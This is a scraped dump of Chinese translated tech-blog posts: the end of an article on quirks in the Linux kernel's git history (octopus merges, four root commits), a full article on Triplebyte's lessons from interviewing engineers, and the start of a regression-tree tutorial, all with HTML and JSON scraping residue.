,C,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,通过查看合并提交的两个父节点中分别存在多少文件，我们可以看到一些蛛丝马迹:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ git log -1 f44dd18 | grep 'Merge:'\r\nMerge: 9395452 7398a66\r\n$ git ls-tree -r 9395452 | wc -l\r\n   55499\r\n$ git ls-tree -r 7398a66 | wc -l\r\n     148,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,git ,log, ,-,1, ,f44dd18, ,|, ,grep, ,'Merge:',Merge,:, ,9395452, ,7398a66,$, ,git ,ls,-,tree, ,-,r, ,9395452, ,|, ,wc, ,-,l,   ,55499,$, ,git ,ls,-,tree, ,-,r, ,7398a66, ,|, ,wc, ,-,l,     ,148,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,一条分支存在大量的文件，因为它包含了整个内核的源文件。而另一条仅仅包含了很少的文件，因为它包含的只是 Greybus 的历史记录。,\n,像章鱼式合并一样，这会让一些 git 用户感到奇怪。但是内核开发人员是专家级的 git 用户，并倾向于放弃使用这个功能，但绝对不是盲目的放弃,\n,最后一个问题:这种情况到底发生了多少次？内核中有多少独立的 “初始化” 提交？事实上是四次:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ git log --max-parents=0 --pretty=\"format:%h %cd %s\" --date=short\r\na101ad9 2016-02-23 Share upstreaming patches\r\ncd26f1b 2014-08-11 greybus: Initial commit\r\nbe0e5c0 2007-01-26 Btrfs: Initial checkin, basic working tree code\r\n1da177e 2005-04-16 Linux-2.6.12-rc2,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,git ,log, ,--,max,-,parents,=,0, ,--,pretty,=,\"format:%h %cd %s\", ,--,date,=,short,a101ad9, ,2016,-,02,-,23, ,Share ,upstreaming ,patches,cd26f1b, ,2014,-,08,-,11, ,greybus,:, ,Initial ,commit,be0e5c0, ,2007,-,01,-,26, ,Btrfs,:, ,Initial ,checkin,,, ,basic ,working ,tree ,code,1da177e, ,2005,-,04,-,16, ,Linux,-,2.6.12,-,rc2,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果我们要画出这些提交，为了清楚起见，我们忽略所有其他的历史记录，如下图:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n566cf87 (the current HEAD)\r\n| | | |\r\n| | | *- a101ad9 Share upstreaming patches\r\n| | |\r\n| | *- cd26f1b greybus: Initial commit\r\n| |\r\n| *- be0e5c0 Btrfs: Initial checkin, basic working tree code\r\n|\r\n*- 1da177e Linux-2.6.12-rc2,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,566cf87, ,(,the ,current ,HEAD,),|, ,|, ,|, ,|,|, ,|, ,|, ,*,-, ,a101ad9 ,Share ,upstreaming ,patches,|, ,|, ,|,|, ,|, ,*,-, ,cd26f1b ,greybus,:, ,Initial ,commit,|, ,|,|, ,*,-, ,be0e5c0 ,Btrfs,:, ,Initial ,checkin,,, ,basic ,working ,tree ,code,|,*,-, ,1da177e, ,Linux,-,2.6.12,-,rc2,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这四个提交中的每一个都是离当前内核版本库 HEAD 节点很遥远的祖先节点，并且都没有父节点。从 git 的角度来看，内核历史“开始”了不同的四次，所有的这些提交最终都被合并在一起。,\n,这四个提交中的第一个（在我们输出的底部）是2005年的初始化提交，也就是我们通常认为的初始化提交。第二个是文件系统 btrfs 的开发，它是独立仓库完成的。第三个是 Greybus,同样也是独立仓库完成的，我们之前已经说过。,\n,第四个初始化提交，a101ad9，很奇怪，正如下面看到的:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ git show --oneline --stat a101ad9\r\na101ad9 Share upstreaming patches\r\n README.md | 2 ++\r\n 1 file changed, 2 insertions(+),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,git ,show, ,--,oneline, ,--,stat ,a101ad9,a101ad9 ,Share ,upstreaming ,patches, ,README,.,md, ,|, ,2, ,++, ,1, ,file ,changed,,, ,2, ,insertions,(,+,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,它刚创建了一个 README.md 文件。但随后，它就立即被合并到正常的内核历史的提交 e5451c8 中了！,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ git show e5451c8\r\ncommit e5451c8f8330e03ad3cfa16048b4daf961af434f\r\nMerge: a101ad9 3cf42ef\r\nAuthor: Laxman Dewangan <ldewangan@nvidia.com>\r\nDate:   Tue Feb 23 19:37:08 2016 +0530,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,git ,show ,e5451c8,commit ,e5451c8f8330e03ad3cfa16048b4daf961af434f,Merge,:, ,a101ad9, ,3cf42ef,Author,:, ,Laxman ,Dewangan, ,<,ldewangan,@,nvidia,.,com,>,Date,:,   ,Tue ,Feb, ,23, ,19,:,37,:,08, ,2016, ,+,0530,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,为什么有人会创建一个只包含两行文本的 README 文件的初始化提交，然后立即合并到主线的历史记录中呢？我想不出任何理由，所以我怀疑这是一个意外！但它没有造成任何危害；它只是很奇怪。（更新：,这是个意外,，Linus用他一贯的方式回应了。）,\n,顺便提一句，这也是历史记录中差异数量排第二的提交，仅仅因为它是一个不相关提交的合并，就像我们仔细研究过的 Greybus 的合并一样。,\n,现在你知道了：Linux 内核的 git 历史记录一些最奇怪的事情。一共有 1,549 个章鱼式合并，其中有一个是拥有 66 个父节点的提交。差异最多的合并有 22,445,760 行差异，尽管它有点技术性因为它和仓库的其他部分没有公共的历史记录。内核拥有四个独立的初始化提交，其中一个是失误导致的。尽管上面的这些都不会出现在绝大多数的 git 仓库中，但是所有的这些功能都是在 git 的设计范围之内的。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,可乐,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            本科在读，对python,linux,安全很感兴趣，希望能够阅读国外最新的技术新闻，也希望能够翻译一些文章帮助到别人        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 13, · , , ,         ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114256/", "url_object_id": "104d59a019864897b6fa5022b135f05e", "front_image_path": "full/2b02c513e245b35efef88916887d9097b0e8d4ee.jpg"},{"front_image_url": ["http://wx1.sinaimg.cn/mw690/63918611gy1fstj3g5udqj20gh0b4wi2.jpg"], "title": "2 年面试 900 多位工程师后，我总结了这些经验", "create_time": "2018/08/08", "vote": "1", "bookmark": "4", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文由 ,伯乐在线, - ,dimple11, 翻译，,刘唱, 校稿。未经许可，禁止转载！,英文出处：,Ammon Bartram,。欢迎加入,翻译组,。,我们在 Triplebyte上进行过很多场面试，实际上，我在过去两年内面试的工程师已经达到 900 余人，这到底算不算卓有成效还真是不好说！（有时我会冒着一身冷汗从梦中惊醒，对这一点充满质疑）。但是不管怎样，我们目标是改进应聘工程师的方式。为此，我们面试时不看求职者的背景，不在乎他们的文凭或简历，只关注他们的编程能力。一个工程师通过了我们这一关后，能直接到我们的合作方公司（包括 Apple、Facebook、Dropbox 和 Stripe）进行终面。我们面试时不知道应聘者的背景，这种情况下看他们是如何在众多顶尖科技公司前大展身手的，我觉得可以给我们的面试提供一些最佳的可用资料。,\n,伯乐在线补注：Triplebyte 是国外一家专注工程师招聘的网站。,\n,在这篇博客中，我要讲讲迄今为止我从这些资料中所学到的东西。技术面试在很多方面都是漏洞百出的，这一点口头说说很简单（而且许多博客都只是这样说说而已！），难的是想出实际的解决方法。我写这篇博客就是为了迎接这个挑战，并为招聘经理和 CTO 提供一些具体的建议。面试这件事有难度，但我想只要遵循一套缜密的流程，那么许多问题都会迎刃而解。,\n,\n,现状,\n,大多数的面试过程主要包括两步：,\n,\n,简历筛选,\n,面试,\n,\n,对求职者的筛选就是为了提前淘汰一些求职申请者，节省面试工作的时间。通常筛选过程包括：招聘官大体浏览求职申请者的简历（大概用时 10 秒以内），然后进行 30~60 分钟的电话面试。我们的合作方公司中有 18% 的公司为了考验求职者，也会出编程题让他们回家完成（要么代替电话面试，要么作为电话面试以外的附加题）。有意思的是，绝大多数的求职申请者都是在筛选这一关被拒的。真是这样，我们合作的所有公司中，单纯因为简历就被筛掉的求职申请者已超过了 50%，另外有 30% 因为电话面试/带回家的项目完成不佳而被刷掉。筛选也是聘用过程最变化无常捉摸不定的环节，应聘者太多，导致招聘人员应接不暇，只能做出仓促的决定，因此这时候求职者的文凭资历和专业匹配度就派上了用场。,\n,终面几乎普遍都是由一系列 45 分钟到 1 小时的会谈组成，每次会谈的面试官都不一样，会谈主要考技术题（每个公司外加一两个针对文化适应和软技能的问题）。招聘经理和每个面试官会在求职申请者离开后，在决策会议上做出他们最终录用/淘汰的决定。在至少有一人力挺，且没人强烈反对的情况下，一个求职申请者才可能被录用。,\n,终面除了常见的形式之外，还有各种千变万化的类型。,\n,\n,我们合作的公司中，39% 会使用白板面试。,\n,有 52% 允许求职者使用他们自己的电脑作答（剩下的 9% 视情况而定）。,\n,有 55% 让面试官随意提问（剩下的 45% 采用一套标准面试题）。,\n,有 40% 要考察求职者的 CS 学术技能后，才能确定去或留。,\n,有 15% 不喜欢 CS 学术技能（而且觉得探讨计算机科学只能暴露该求职者生产力低）。,\n,有 80% 允许求职申请者在面试时使用任何编程语言（剩下的20%要求他们使用特定编程语言）。,\n,有 5% 会在面试过程中直白地评价求职者编程语言的细节。,\n,\n,\n,放眼所有与我们合作的公司，终面后决定录用的占 22%。（这个数据是通过询问公司内部招聘渠道获得的。Triplebyte 上的求职者通过公司面试被录用的成功率为 53%。）其中大概 65% 会接受 offer（达成雇佣关系）。一年后，公司对录用了 30%、开除率 5% 的情况非常满意。,\n,漏招 VS 误招,\n,所以，现在的面试存在什么问题呢？毕竟开除员工的频率并非是不可控的。为了更清楚地看待这个问题，我们需要考虑导致面试失败的两种情况：,\n,\n,面试了一个不合格的工程师，却将其聘用，过后只好开除（误招）；,\n,面试了一个工作能力很强的工程师，却认为他不合格，选择不予聘用（漏招）。,\n,\n,误招一眼就能看出来，公司会（在薪水、管理成本和全团队的精神面貌上）付出很大代价，会把一个团队搞得萎靡不振。而与之对比，漏招的损失却看不出来。虽然以上任意一种情况都很有问题，但由于这误招和漏招引发的后果乍一看很不平衡，所以公司的面试很大程度上倾向于不予聘用。,\n,面试中存在的干扰会使公司不予聘用的倾向更加严重。在一小时内评估一个人的编程能力本来就是很难的，各种条件经历的匹配、某些直觉感受和以上谈到的公司的复杂喜好等因素掺杂进来，使得你在面试别人时被各种干扰团团围困。,\n,为了在受干扰环境下把误招率控制在一个较低的水平，公司在招聘时越来越偏向于不予聘用。这样会错过优秀的工程师，会使文凭的重要程度高过实力，也会由于反复无常，使参与其中的人（面试官和求职者等）感到失望。,假使你公司中的每个员工为了争取他们当前的职位都得重新参加面试，那么通过率能有多大呢？,这个问题很骇人，几乎可以确定他们不可能都被录取。求职申请人会因为本有能力为公司好好效力却没被录用而神伤，公司也会因为找不到可用之才而遭受损失。,\n,要澄清一点，我不是说公司应该降低面试的门槛，相反，面试招人正因为会有拒绝才存在的意义！我更不是说公司对误招的担忧远大过漏招是不对的，招错人要付出高昂代价，,我想说的是：各种干扰信号的影响外加之对于,误招,的防范，会导致,面试的漏招率大大攀升，导致人才流失。为解决这一问题，就需要,改善面试环境,。,\n,减少面试中干扰因素的具体方法,\n,1.决定你想要招聘哪方面的技术人才,\n,一个程序员不可能因为具备了哪一套技能就能被定义为优秀的程序员了，相反，世上的编程技能多得犹如汪洋大海，没有工程师能在所有的领域都游刃有余。实际上，我们在 Triplebyte上碰到过一些杰出、成功的软件工程师，他们在几个毫不相关的领域都颇有建树。面试成功的第一步就是决定你想要招聘哪方面的技术人才。我建议你问自己以下几个问题：,\n,\n,你想要的程序员是效率高，但写的代码不完善需反复修改的，还是一丝不苟、思维严密的？,\n,你想要的程序员是热衷于解决技术难题的还是构建产品的？,\n,你想要已经具备某种特定技能的人才还是在工作中有很强的学习能力的？,\n,计算机科学学术/数学/算法方面的能力是至关重要的还是无关紧要的？,\n,了解并发/ C内存模型/ HTTP 很重要吗？,\n,\n,这些问题没有正确答案，我们合作的成功企业对以上每个问题选任一方的都有。,但关键是要根据自己的需求,有针对性地做出选择,，应该避免,随便向求职者抛个,面试,问题了事（或者让,每个,面试官决定）。,这样的话，公司的工程文化就会有一定倾向：淘汰掉越来越多虽然有一技之长但是对公司并没太大用处的、以及不具备公司所需技能（却具备其他重要技能）的工程师。,\n,2.问尽可能和实际工作相贴切的问题,\n,专业程序员的任务是花数周数月的时间解决大型的、错杂延展的问题，但是面试官并没有数周数月的时间去评估求职申请者的能力，通常每个面试官只有一个小时去考核，所以他们会转而去考察求职申请者在强压下迅速解决小问题的能力。这是两种不同的能力测试。二者有一定的相关性（面试并不完全随机），但并不是完全相关。制定面试问题的一大目标就是减少面试考察和实际工作的差异。,\n,方法是在面试时向申请某一职位的求职者（或者为了衡量某一技能）问尽可能相似的问题。比如说，如果你关心后端编程，那就让求职申请者建一个简单的 API 端点，再添加特性，几乎可以肯定，这比让他们解决一个 BFS 词链问题有意义得多；如果你关心算法能力，那让求职者在问题中运用算法（比方说，建一个简单的搜索索引，可能使用 BST 和 hashmap，实现提升删除操作的性能），几乎可以肯定，这比让他们确定一点是否包含在一个凹多边形中有意义得多；让求职者在实际编程过程中去尝试调试程序，几乎可以肯定，这比让他们去解决一个白板上的小问题有意义得多。,\n,即便如此，面试中要不要让程序员在白板上作答还是有争议的。作为面试官，我不在乎工程师是否记住了 Python 中的 itertools 模块，我在乎的是他们是否想通了如何用 itertools 模块去解决问题。通过让他们在白板上答题，他们便可以不用遵循严格的编程语法，而完全专注于逻辑问题。但最终白板答题的提议还是行不通，因为白板上答案的形式五花八门，没有那么多的评判标准可以对它们一一进行对错评判。所以让求职申请者们回归到电脑上编程，同时告诉他们不必真正去运行代码（或者采用更好的方法，进行开卷面试，让他们在 Google 上查询任何所需的信息），那么考察他们的目的就已经达到了。,\n,面试问题应该对日后工作有所反应，对此要特别警告，面试不依赖于外部因素是至关重要的。比如说，让一个求职者用 Ruby 编写一个简单的爬虫看似是个很好的实际问题，但是，如果求职者为此需要先安装 Nokogiri （一个安装起来非常费劲的 Ruby 解析库），结果花了 30 分钟绞尽脑汁应对本地扩展，那么这次面试就糟透了，不仅浪费了时间，而且也让求职者一下子压力爆棚。,\n,3.问不会提前泄露的多面性问题,\n,另一个针对面试提问的经验之谈是避免提问有可能会“泄露”出去的问题。比如说，有些问题的某些信息可能求职申请者提前能从 Glassdoor 上读到，所以他们回答起来就会轻而易举，因此这类问题就要避免提问，否则求职者明显就不用动脑筋了，也抹杀了需要考验他们直觉洞察力的地方。而且除此之外，也意味着面试的问题应该由一系列相互承载的部分组成，而不是一个单一的中心。换种有用的方式去想，问问你自己，能不能在面试时帮助一个陷于困境的求职者，并让他在面试结束还能给大家留下一个不错的印象。对答案唯一的问题，如果你给求职申请者提供了明显的帮助，那么他就直接面临淘汰；而对于多面性的问题，你帮了求职申请者一步，那么他还有机会在其余部分大展身手，完美表现。,\n,伯乐在线补注：Glassdoor 是国外一家做企业点评和职位搜索网站。,\n,这一点很重要，不仅因为你的问题会在  Glassdoor 上泄露出来，而且（更重要的）是因为多面性的问题可以减少干扰。优秀的求职者会背负压力，陷于困境，面试时很重要的一点就是对他们提供帮助，从而让其好好发挥。考查他们解决任意小编程逻辑问题的能力时，他们最近一段时间是不是看到过、或可能只是恰巧碰到过类似的问题，会对考查造成明显干扰，而多面性的问题则可以消除一些干扰，也让求职者们有机会看到他们的努力像滚雪球一样越积越大。给他们提供一步的帮助，往往能帮他们解决紧接着的下一步，这给实际工作提供了重要动力，在面试时把握这一点就可以减少干扰。,\n,举例来说，让一个求职者在终端实现“四子连珠”游戏（一系列多个步骤），可能要比让他去旋转矩阵（一个单独步骤，外加之一些小操作）要好得多；让求职者实现 k 均值聚类（建立在彼此之上的多个操作）可能要比找到直方图中的最大矩形（leetcode 的一道算法题）要好得多。,\n,4.避免问很难的问题,\n,如果求职者很好地解决了一个很难的问题，那能极大地证明他的能力，但也正因为这个问题很难，所以大多数求职者都无力招架。你想要获得的信息量就很大程度上依赖于问题的难度，我们发现面试问题最合适的难度要明显比大多数面试官所想的简单得多。,\n,这一点影响更大，因为面试求职者时，获得的信息有两种来源：他们是否对一个问题给出了“正确的”答案、他们得出答案的过程/得出答案的容易程度。我们在 Triplebyte上收集了这方面的数据（同时给他们是否得出了正确答案和他们花费了多大努力这两项打分，然后衡量对公司而言哪个分数能更准确地对求职者能力进行预测）。我们发现这是一种权衡，对于更难的问题，求职者是否给出了正确的答案更能说明问题，相比之下，对于更简单的问题，求职者的答题过程和他们花费的努力程度则更有参考价值。考量了这两种信息来源后，面试问题最适宜的难度会往更加简单的方向偏移。,\n,我们现在遵循的经验法则是，面试官解决问题所用的时间应该是他们希望求职申请者们解决问题所花时间的25%。所以如果我在为时1小时的面试中提出了一个新的问题，我希望我的同事（没有提醒的情况下）能在15分钟内解答。外加之我们应问实际环境下的多面性问题，这意味着最佳的面试问题真的是相当直白和简单的。,\n,要澄清一点，我不是说要降低通过率的门槛。我支持问简单的问题，然后将他们回答的情况纳入考评范围；我支持问简单的问题，然后给予相当严苛的评判。这就是我们所找到的对面试环境进行优化的方式，这种方式额外产生的好处就是可以降低大部分求职者的面试压力。,\n,举例来说，让一个求职者创建一个简单的命令行接口，要求存储和检索键值对（如果做得好的话就再增添功能），可能要比让他们为算数表达式实现解析器要好得多；面试问题包含最普通的数据结构（表、哈希、还可能有树）可能要比涉及跳表、二叉排序树或其他更模糊的数据结构要好得多。,\n,5 向每个求职申请者问相同的问题,\n,面试就要对各个求职申请者进行比较，我们的目标就是将他们分为能为公司奉献光与热的和不能奉献的（在大家申请同一职位的情况下，选出申请人中最优秀的一个）。鉴于此，就没有理由向不同的求职申请者问不同的问题。如果你对申请同一职位的不同求职申请者采用不同的方式进行评判，那么你就引入了干扰因素。,\n,面试之所以一直都是当场选择问题，我觉得是因为面试官更喜欢这种方式。科技公司的工程师通常不喜欢面试别人，他们只是偶尔面试一下，面试会使他们偏离工作重点。为了将针对每个求职申请者的面试问题规范化，面试官们就需要花费更多的时间去学习如何制定面试问题，并且探讨面试打分、交接的方式。而且每次问题一发生变化，他们就需要重复以上过程。经常问同样的问题只是有些枯燥乏味而已。,\n,不幸的是，面试成功唯一的正解就是面试官需要花费心力。保证一致性是实现良好面试的关键所在，也就是说向每个求职申请者问相同的问题，并且要确保交接标准化，除此之外别无他法。,\n,6.考虑实行多重的面试方法,\n,与我之前的观点相悖，这里我们可以考虑提供几种截然不同的面试方法。筹备面试时，我们首先应该考虑想要招哪种类型的技术人才，但是我们想要的人才特质可能是相矛盾的，这一点很常见，例如想要招非常有数学天分的工程师，和一些高产/重复性强的工程师（甚至可能是针对同一职位）。在这种情况下，考虑采用多重的面试方法，其中关键在于你要很大程度上保证每种面试方法都是完全规范化的，我们在 Triplebyte上就在这样做。我们发现你仅需问每个求职申请者他们所青睐的面试方法即可。,\n,7.不要因为资历而小看别人,\n,资历不是没用的，毕业于麻省理工或者斯坦福的，抑或在谷歌和苹果公司工作过的工程师组建的队伍确实要比没这些资历的工程师更加优秀，但问题是绝大多数工程师（包括我自己）都没有以上资历，,所以如果一个公司对此过分看重，那他们就会错失大多数编程大牛。,在筛选环节将申请人的资历纳入考量范围并非毫无道理。我们在 Triplebyte 上没这么做（我们的考评是100%不看背景的），但是在筛选时对申请人的资历做一定的参考可能会有用。,\n,但是若让资历问题影响最终面试结果，那就没有道理了，数据表明这种情况确有发生。在我们不看背景进行考评的过程中，对于表现情况一定的求职申请者，那些简历上写有名校文凭的要在比没有名校文凭的人过关率高30%。如果面试官知道求职申请者手握麻省理工的文凭，那他们就更愿意原谅他们在面试环节暴露出来的一些瑕疵。,\n,这就是你应该避免的干扰，最显而易见的解决方式就是在开始面试前直接跳过申请者简历上的学校和公司名，有些求职申请者可能会提到他们的学校或公司，但是我们的面试都不看申请者的背景，而且在进行技术考评时，申请者自己提背景的情况也是相当少见的。,\n,8.避免羞辱,\n,面试失败的最丑恶的一种情况，就是招聘人员表现出一种羞辱的态度。他们不仅是对求职者技能进行考评的人，而且也代表即将要纳入成员的一个组或一支团队，在第二种身份下，面试是迎接新成员的重要仪式。面试确实让人有压力，很恐怖，但我们都会背负面试压力，所以求职者也自然会有压力，尤其在求职者表现不佳时，面试压力会更加凸显出来。当面试官看到求职者对着答案看上去那么显而易见的问题，就是答不出来急得砸脑袋时，就会觉得大失所望，气不打一处来，同时又万分沮丧，这样无疑会让求职者压力更大，形成恶性循环。,\n,一般这种情况面试官唯恐避之不及，为此应该展开探讨，并且对面试官进行培训。我们用的一个策略是，当求职者表现很差劲时，就将想要对其进行考评的评估模式切换成想要让其理解问题正解的教学模式。心理上的这种切换大有裨益，当你采用教学模式时，你就没有理由硬忍住不说答案了，也会变得完全亲和友善。,\n,9.根据最高技能，而非平均或最低技能做录用决定,\n,迄今为止，我只探讨过单独的问题，却没有谈过最终的面试决策。我的建议：在做录用决定时应看求职者（在你所关心的技能中）具备的最高水平技能，而非中等或最低水平技能。,\n,无论是有意还是无意，你们好像就是这么做的。每个面试过求职者的面试官通过聚在一起开会，来制定最终的录用/淘汰决定。在至少有一人力挺，且没有人强烈反对的情况下，求职申请者就会被录用。要想让一人力挺，求职申请者就需要主攻面试的其中一个部分，大显身手。我们的数据显示，要在公司面试的至少其中一个部分表现优异，求职者具备的最高技能就是最紧密的影响因素了。然而，为了得到 offer，求职者也需要保证没有强烈反对的声音，而若回答问题时表现得非常愚蠢，那么就不会引发强烈的反对。,\n,这里我们会发现大量的干扰，技术高明的工程师具备的能力各式各样，因而几乎不可能有求职者能驾驭所有技能。,这就意味着如果你问了一个正确的（或错误的）问题，任何工程师都有可能出丑。,那么求职者至少在一次面试中，体现了在一方面的优势（最高技能），且没有暴露在某些方面的明显劣势，才能获得 offer，而这里就有干扰出现。如同一个工程师在回答有关网络系统的面试问题时表现不好而遭到淘汰，但却在另一个面试中成绩优异，只因为面试没出网络系统的问题。,\n,我认为最好的解决方法就是让公司专注于求职者的最高技能，同时对于面试中部分环节表现不佳的人也能通融给过。,这就是说，寻找充分的理由去录用，而不要因为求职申请者在某些技术领域能力薄弱的而过分担心。,我不想表现得过于绝对，当然有些领域对公司是至关重要的。而且对于企业文化，若团队中每个人在特定的领域都有特定的定位，那很可能大有裨益，但是将更多的注意力集中于最高技能着实可以减少面试中的干扰。,\n,到底为什么要搞面试？,\n,我应该回答的最后一个问题是为什么要搞面试？我确信有些读者已经咬牙切齿地问“对一个破败的系统想那么多干嘛？直接用带回家的项目进行考评不就行了！或者直接采取试用呗！”毕竟，一些非常成功的企业都会进行试用（求职者在团队中待一周），或者用带回家的项目取代当面面试。试用是很有意义的，几乎可以肯定的是，让他们花一周的时间跟在一个工程师旁边工作（或者看他们是如何完成一个实际的项目的），要比让他们回答1小时的面试问题更能反映能力。然而，有两个问题导致试用一直无法取代标准面试：,\n,1.要进行试用的话，公司要承受高昂成本，没有公司能为每个求职申请者承担整整一周的试用花销。因而公司必须采用其他的面试环节来决定试用的人选。,\n,2.试用（以及大型的带回家完成的项目）对求职者而言成本高昂，即使他们能获得报酬，那也未必有空参与。比如一个工程师的工作是全职的，就可能没法抽空干别的，而且就算能抽出时间，可能也不愿意。而且如果一个工程师已经获得了一些offer，那就不太可能再甘愿承受结果还充满不确定性的试用考验了，这一现象明显能从 Tripletype 上的求职者中看到。许多最优秀的求职申请者（拥有其他公司的offer）只是单纯不做大型项目或者不经受试用考验。,\n,试用是一种选人的绝佳方式。,我认为如果你有开展试用的经济实力，那么加上试用这种选人方式是很不错的。但要想让这取代技术面试，并不完全可行。,\n,了解工程师过去的开发经历也可以成为取代技术面试的一种方式。逻辑上来看，通过了解他们过去的开发情况，就可以推知他们未来是否可以将工作干得得心应手。遗憾的是，我们在 Triplebyte 上实行此方法时，收效甚微。表达能力（推销自己的能力）强的到头来要比技术能力强的人更有胜算，巧舌如簧的工程师对自己的职能夸夸其谈（将整个团队的功劳独吞），谦虚谨慎的工程师却对自己的成绩轻描淡写，这样的现象屡见不鲜。如果有充分的时间和大量的问题去刨根究底，就有可能弄清楚真实情况，但是我们发现，常规面试时间有限，谈论过去的开发经历通常并不能取代技术面试。虽然谈过去经历有助于破冰，拉近和求职申请者间的关系，能够对他们的兴趣有所了解，（而且能从中评判求职者的表达能力，还有可能看出他和企业的的文化契合度），但要想让这取代技术面试，并不完全可行。,\n,编程面试的好处！,\n,我想让这篇博客以更加乐观的角度作结，无论面试存在多大的问题，但采用这种方法其实也有颇多好处。,\n,面试是对申请者能力的直接评估，我有一些朋友是当老师的，他们告诉我教师面试基本上考察的是语言表达能力（推销自己的能力）和所具备的文凭资历，这一点似乎从很多职业中都能得到印证。硅谷没有非常完美的精英体制，但我们至少确实在设法对申请者应具备的重要能力进行直接衡量，并且秉持达观开放的思想，认为一个人无论背景如何，只要具备相应的能力，就能够成为非常优秀的工程师。对文凭资历的偏见会成为贯彻这种思想的阻力，但我们在 Triplebyte 上已经很大程度上克服了这种偏见，并帮助很多没有常规资历的人找到了很好的技术工作。我认为 Triplebyte 不太可能解决比如在法律层面的问题，因为社会对于求职者文凭资历实在是太重视了。,\n,程序员同时也在选择面试形式。尽管这个话题颇有争议（当然有程序员对此持异议），但我们提供了各式各样不同的考评形式，通过试验，我们发现绝大多数的程序员还是会挑选常规的面试形式，仅有一小部分人会对公司采用试用或带回家的项目进行考评的形式更感兴趣。无论怎样，我们这里要说的是编程面试，其他形式的考评都能作为很好的补充备选，但看起来不太可能取代面试成为考评工程师的主要形式。,不确切地套用丘吉尔的一句话：“面试是最差的一种考评工程师的方式，但它是我们迄今为止所能找到的最好的一种方式。”,\n,结论,\n,面试工作很难，无奈的是人类都是复杂的。从某种程度上来说，想要靠区区几小时的面试去评判一个人的能力，这是傻子才会干的事，因而我觉得保持谦逊的态度是至关重要的。任何面试在很多时候都注定会失败，只是因为人实在是太复杂了。,\n,但这并不是说着我们应该放弃，,试着将面试过程不断优化要比什么都不做好得多。,在 Triplebyte 上，面试就是我们的产品，我们集体讨论，想出考评测试方法，进而随着时间的推移不断优化面试方式。我在这篇博客中分享了过去两年多学到的一些重点，期待反馈，想知道这些观点是否能够让大家受益。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 4 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,dimple11,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            简介还没来得及写 :）        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 15,        ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114168/", "url_object_id": "7eac33cc1db7f0b9050885470a418bae", "front_image_path": "full/eab8e43cab7042122aaedf074f24e0e4a29fce44.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/04/ff247977ac3e5237654ad324e8c880ed.jpg"], "title": "回归树的原理及其 Python 实现", "create_time": "2018/08/10", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文作者： ,伯乐在线, - ,伯乐在线读者, 。未经作者许可，禁止转载！,欢迎加入伯乐在线 ,专栏作者,。,提到回归树，相信大家应该都不会觉得陌生（不陌生你点进来干嘛[捂脸]），大名鼎鼎的 GBDT 